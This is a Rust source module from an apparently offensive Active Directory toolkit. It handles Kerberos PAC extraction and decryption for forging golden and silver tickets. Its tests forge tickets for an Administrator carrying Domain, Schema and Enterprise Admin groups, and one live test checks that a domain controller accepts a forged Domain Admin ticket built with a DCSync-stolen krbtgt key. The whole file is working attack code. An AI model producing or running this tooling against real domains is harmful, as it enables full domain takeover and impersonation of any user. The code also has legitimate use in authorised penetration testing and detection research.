//! PAC handling for Kerberos ticket forging (golden / silver tickets).
//!
//! The byte-level PAC marshaling/parsing/signing lives in the standalone [`ms_pac`] crate and
//! is re-exported here. This module keeps the two ticket-level pieces that need picky-krb and
//! ADhammer's [`Tgt`]: decrypting a real ticket's EncTicketPart (the byte-oracle that proves
//! the DCSync-extracted krbtgt key) and pulling the PAC out of authorization-data.

use crate::Tgt;
use anyhow::{anyhow, bail, Result};
use picky_asn1::wrapper::ExplicitContextTag10;
use picky_asn1_der::application_tag::ApplicationTag;
use picky_krb::crypto::CipherSuite;
use picky_krb::data_types::{AuthorizationData, EncTicketPart};

pub use ms_pac::{
    assemble_pac, build_attributes, build_client_info, build_kerb_validation_info,
    build_requestor, buf_name, parse_pac, ForgeIdentity, PacBuf, PacError, ParsedPac,
    PAC_ATTRIBUTES_INFO, PAC_CLIENT_INFO_TYPE, PAC_KDC_CHECKSUM, PAC_LOGON_INFO, PAC_REQUESTOR,
    PAC_SERVER_CHECKSUM, PAC_TICKET_CHECKSUM, SIG_HMAC_MD5,
};

/// EncTicketPart is `[APPLICATION 3] SEQUENCE` on the wire.
type EncTicketPartApp = ApplicationTag<EncTicketPart, 3>;

/// key usage 2 — EncTicketPart sealed under the server (here krbtgt) key.
const KEY_USAGE_TICKET: i32 = 2;

/// Pull the PAC bytes out of an EncTicketPart's authorization-data:
/// AD-IF-RELEVANT (type 1) → inner AuthorizationData → AD-WIN2K-PAC (type 128).
pub fn extract_pac(auth: &ExplicitContextTag10<AuthorizationData>) -> Result<Vec<u8>> {
    // DER-encoded signed integer bytes → value (ad_type is small: 1 and 128 here).
    let val = |b: &[u8]| b.iter().fold(0i64, |a, &x| (a << 8) | x as i64);
    for outer in &auth.0 .0 {
        // ad_type 1 = AD-IF-RELEVANT: ad_data is a nested AuthorizationData DER.
        if val(&outer.ad_type.0 .0) == 1 {
            let inner: AuthorizationData = picky_asn1_der::from_bytes(&outer.ad_data.0 .0)
                .map_err(|e| anyhow!("decode AD-IF-RELEVANT: {e}"))?;
            for e in &inner.0 {
                if val(&e.ad_type.0 .0) == 128 {
                    // 128 = AD-WIN2K-PAC
                    return Ok(e.ad_data.0 .0.clone());
                }
            }
        }
    }
    bail!("no AD-WIN2K-PAC in ticket authorization-data")
}

/// Decrypt a real TGT's EncTicketPart with the krbtgt AES256 key and return
/// (the parsed enc-ticket-part, the raw PAC bytes). Doubles as a live proof that the
/// DCSync-extracted krbtgt key is correct: AES decryption is integrity-protected, so a
/// wrong key fails here rather than yielding garbage.
pub fn decrypt_ticket_pac(tgt: &Tgt, krbtgt_aes256: &[u8]) -> Result<(EncTicketPart, Vec<u8>)> {
    let cipher = CipherSuite::Aes256CtsHmacSha196.cipher();
    let plain = cipher
        .decrypt(krbtgt_aes256, KEY_USAGE_TICKET, tgt.ticket_cipher())
        .map_err(|e| anyhow!("decrypt EncTicketPart with krbtgt key (wrong key?): {e}"))?;
    let etp: EncTicketPart = picky_asn1_der::from_bytes::<EncTicketPartApp>(&plain)
        .map_err(|e| anyhow!("decode EncTicketPart: {e}"))?
        .0;
    let auth = etp
        .authorization_data
        .0
        .as_ref()
        .ok_or_else(|| anyhow!("ticket has no authorization-data (no PAC)"))?;
    let pac = extract_pac(auth)?;
    Ok((etp, pac))
}

#[cfg(test)]
mod offline {
    use super::*;

    fn sample() -> ForgeIdentity {
        ForgeIdentity {
            user: "Administrator".into(),
            rid: 500,
            primary_gid: 513,
            group_rids: vec![513, 512, 520, 518, 519],
            domain_subauths: vec![21, 1111111111, 2222222222, 3333333333], // synthetic S-1-5-21-…
            logon_server: "DC01".into(),
            logon_domain: "CORP".into(),
        }
    }

    /// A forged silver ticket must round-trip: seal under a service key, then decrypt the
    /// EncTicketPart back with that key (AES integrity holds) and recover a parseable PAC whose
    /// LOGON_INFO carries the forged identity.
    #[test]
    fn silver_ticket_roundtrips() {
        let key = [0x37u8; 32];
        let tgt =
            crate::forge_silver_tgt(&sample(), "CORP.LOCAL", &key, "cifs/dc01.corp.local", false)
                .unwrap();
        let (_etp, pac) = decrypt_ticket_pac(&tgt, &key).expect("decrypt silver");
        let parsed = parse_pac(&pac).unwrap();
        let li = &parsed.get(PAC_LOGON_INFO).unwrap().data;
        // UserId at fixed offset 120 in the LOGON_INFO buffer.
        assert_eq!(u32::from_le_bytes(li[120..124].try_into().unwrap()), 500);
        assert!(parsed.get(PAC_SERVER_CHECKSUM).is_some());
    }

    /// RC4 golden ticket: forge under an NT-hash krbtgt key, then decrypt the EncTicketPart back
    /// with RC4-HMAC (usage 2), recover the PAC, and confirm the SERVER_CHECKSUM is a valid
    /// KERB_CHECKSUM_HMAC_MD5 (type -138) over the zeroed-signature PAC. Proves the RC4 forge +
    /// HMAC-MD5 PAC signing are byte-correct, independent of any KDC etype policy.
    #[test]
    fn rc4_golden_roundtrips() {
        let nt = crate::rc4::nt_hash("Krbtgt-NT-Hash!");
        let tgt = crate::forge_golden_tgt(&sample(), "CORP.LOCAL", &nt, true).unwrap();
        let plain = crate::rc4::decrypt(&nt, 2, tgt.ticket_cipher()).expect("rc4 decrypt ticket");
        let etp: EncTicketPart = picky_asn1_der::from_bytes::<EncTicketPartApp>(&plain)
            .expect("EncTicketPart decode")
            .0;
        let auth = etp.authorization_data.0.as_ref().expect("has auth-data");
        let pac = extract_pac(auth).expect("extract PAC");
        let parsed = parse_pac(&pac).unwrap();
        let srv = parsed.get(PAC_SERVER_CHECKSUM).unwrap();
        // SignatureType must be -138 (HMAC-MD5), signature 16 bytes.
        assert_eq!(
            i32::from_le_bytes(srv.data[0..4].try_into().unwrap()),
            crate::rc4::SIG_HMAC_MD5
        );
        assert_eq!(srv.data.len(), 4 + 16);
        // Recompute the server checksum over the PAC with both signatures zeroed.
        let stored = srv.data[4..20].to_vec();
        let mut zeroed = pac.clone();
        for i in 0..parsed.buffers.len() {
            let base = 8 + i * 16;
            let t = u32::from_le_bytes(zeroed[base..base + 4].try_into().unwrap());
            let off = u64::from_le_bytes(zeroed[base + 8..base + 16].try_into().unwrap()) as usize;
            if t == PAC_SERVER_CHECKSUM || t == PAC_KDC_CHECKSUM {
                for b in zeroed[off + 4..off + 20].iter_mut() {
                    *b = 0;
                }
            }
        }
        assert_eq!(
            crate::rc4::hmac_md5_checksum(&nt, 17, &zeroed).to_vec(),
            stored,
            "RC4 golden SERVER_CHECKSUM (HMAC-MD5) mismatch"
        );
    }
}

#[cfg(test)]
mod live {
    use super::*;

    /// Live oracle: get recon's real TGT, decrypt its EncTicketPart with the DCSync-extracted
    /// krbtgt AES256 key, and dump the PAC buffer layout. Proves the krbtgt key AND captures the
    /// authoritative Server 2025 PAC shape for the forger.
    /// Env: ADH_KDC, ADH_REALM, ADH_KRBTGT_AES256 (64 hex), ADH_USER/ADH_PASS.
    #[tokio::test]
    #[ignore = "live DC"]
    async fn decrypt_real_pac() {
        let Ok(kdc) = std::env::var("ADH_KDC") else {
            return;
        };
        let realm = std::env::var("ADH_REALM").unwrap_or_else(|_| "CORP.LOCAL".into());
        let user = std::env::var("ADH_USER").unwrap_or_else(|_| "lowpriv".into());
        let pass = std::env::var("ADH_PASS").unwrap_or_default();
        let key = hex::decode(std::env::var("ADH_KRBTGT_AES256").expect("ADH_KRBTGT_AES256"))
            .expect("hex");

        let tgt = crate::get_tgt(&user, &pass, &realm, &kdc)
            .await
            .expect("get_tgt");
        let (etp, pac) = decrypt_ticket_pac(&tgt, &key).expect("decrypt PAC");
        let parsed = parse_pac(&pac).expect("parse PAC");
        eprintln!(
            "[pac] {} bytes, flags={:02x?}, {} buffers:",
            pac.len(),
            etp.flags.0.as_bytes(),
            parsed.buffers.len()
        );
        for b in &parsed.buffers {
            eprintln!(
                "  type={:2} {:32} {} bytes  {}",
                b.ul_type,
                buf_name(b.ul_type),
                b.data.len(),
                hex::encode(&b.data[..b.data.len().min(48)])
            );
        }
        if std::env::var("ADH_DUMP_LOGON").is_ok() {
            let li = parsed.get(PAC_LOGON_INFO).unwrap();
            eprintln!("[logon_info_full] {}", hex::encode(&li.data));
        }
        // must at least carry LOGON_INFO + both checksums
        assert!(parsed.get(PAC_LOGON_INFO).is_some());
        assert!(parsed.get(PAC_SERVER_CHECKSUM).is_some());
        assert!(parsed.get(PAC_KDC_CHECKSUM).is_some());
    }

    /// Forge a Domain-Admin golden ticket with the DCSync-extracted krbtgt AES256 key and PROVE
    /// the KDC accepts it: submit the forged TGT in a TGS-REQ (PA-TGS-REQ), which forces the KDC
    /// to decrypt the ticket and validate the PAC's KDC signature under full KB5020805 enforcement.
    /// A TGS-REP back = the golden ticket (marshaling + both signatures + requestor) is valid.
    /// Env: ADH_KDC, ADH_REALM, ADH_KRBTGT_AES256, ADH_DOMAIN_SID (S-1-5-21-a-b-c), ADH_SPN.
    #[tokio::test]
    #[ignore = "live DC"]
    async fn golden_ticket_accepted() {
        let Ok(kdc) = std::env::var("ADH_KDC") else {
            return;
        };
        let realm = std::env::var("ADH_REALM").unwrap_or_else(|_| "CORP.LOCAL".into());
        let key = hex::decode(std::env::var("ADH_KRBTGT_AES256").expect("ADH_KRBTGT_AES256"))
            .expect("hex");
        // Domain SID sub-authorities: "S-1-5-21-a-b-c" → [21,a,b,c].
        let dsid = std::env::var("ADH_DOMAIN_SID").expect("ADH_DOMAIN_SID");
        let subs: Vec<u32> = dsid
            .trim_start_matches("S-1-5-")
            .split('-')
            .map(|x| x.parse().unwrap())
            .collect();
        let spn = std::env::var("ADH_SPN")
            .unwrap_or_else(|_| format!("cifs/dc01.{}", realm.to_lowercase()));

        let id = ForgeIdentity {
            user: "Administrator".into(),
            rid: 500,
            primary_gid: 513,
            group_rids: vec![513, 512, 520, 518, 519], // Users, Domain/Schema/Enterprise Admins, GPO Creators
            domain_subauths: subs,
            logon_server: "DC01".into(),
            logon_domain: realm.split('.').next().unwrap_or("CORP").to_uppercase(),
        };
        let tgt = crate::forge_golden_tgt(&id, &realm, &key, false).expect("forge golden");
        let hash = crate::roast_spn(&tgt, "Administrator", &spn, &kdc)
            .await
            .expect("KDC must accept the golden ticket (TGS-REP for the SPN)");
        eprintln!("[golden] KDC accepted forged DA TGT → service ticket for {spn}");
        assert!(hash.contains("$krb5tgs$") || !hash.is_empty());
    }
}
